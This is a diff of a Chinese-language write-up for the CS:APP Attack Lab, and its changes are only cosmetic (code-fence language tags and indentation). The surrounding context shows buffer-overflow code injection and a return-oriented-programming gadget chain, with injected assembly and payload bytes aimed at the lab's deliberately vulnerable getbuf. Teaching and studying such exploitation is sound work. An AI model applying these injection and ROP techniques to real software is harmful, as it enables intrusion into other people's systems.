@@ -22,7 +22,7 @@ phase1很简单，关键就是**用touch1的地址覆盖掉原来的返回地址
 和Phase1的不同在于Phase2需要传递参数，即**把我的cookie传递到rdi寄存器中**
 所以需要想办法让程序执行下面的汇编代码
 
-```asm
+```nasm
 movq $0x45730404,%rdi
 pushq $0x40173c
 ret
@@ -32,7 +32,7 @@ ret
 
 使用gcc编译再用objdump反汇编，会得到
 
-```asm
+```nasm
 0000000000000000 <.text>:
    0:	48 c7 c7 04 04 73 45 	mov    $0x45730404,%rdi
    7:	68 3c 17 40 00       	push   $0x40173c
@@ -76,7 +76,7 @@ a0 7f 65 55 00 00 00 00
 
 我的想法就是把需要的字符串首先输入，存储在getbuf的栈帧上，然后就可执行如下指令
 
-```asm
+```nasm
 movq $0x55657f98,%rdi 
 pushq $0x40184d
 ret
@@ -90,7 +90,7 @@ ret
 所以我的字符串并不能放在getbuf的栈帧中....
 注意到getbuf是由test调用，二者的关系如下：
 
-```C
+```c
 unsigned getbuf()
 {
 	char buf[BUFFER_SIZE];
@@ -133,14 +133,14 @@ Phase4仍然是解决touch2，需要输入我们的cookie
 首先我们需要想办法把我们的cookie传递到程序中，由于栈的位置不确定，不能直接使用立即数了，只能想办法把cookie传递给rdi寄存器
 我们只需要把我的cookie放到栈顶，然后执行如下指令
 
-```asm
+```nasm
 popq %rdi
 ret
 ```
 
 然而我们翻遍`farm`也只能找到`popq %rax`对应的字节码，于是只能这样
 
-```asm
+```nasm
 popq %rax  //58
 movq %rax,%rdi //48 89 c7
 ```
@@ -173,13 +173,13 @@ ec 18 40 00 00 00 00 00
 /* Add two arguments */
 long add_xy(long x, long y)
 {
-    return x+y;
+	return x+y;
 }
 ```
 
 其对应的汇编是这样
 
-```asm
+```nasm
 0000000000401923 <add_xy>:
   401923: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
   401927: c3                    ret
@@ -199,7 +199,7 @@ long add_xy(long x, long y)
 那么我们只能想办法把偏移量传给rsi了，我们这时候显然并不知道偏移量，但我们知道如何把偏移量传递给寄存器，也就是使用popq指令，然而同样的，我们只能找到`popq %rax`对应的字节码，接下来的任务就是想办法把rax的值传给rsi了
 经过一系列的尝试(这里就不写了)，我们最后发现只有这么一套操作是可行的：
 
-```asm
+```nasm
 movl %eax,%ecx
 movl %ecx,%edx
 movl %edx,%esi
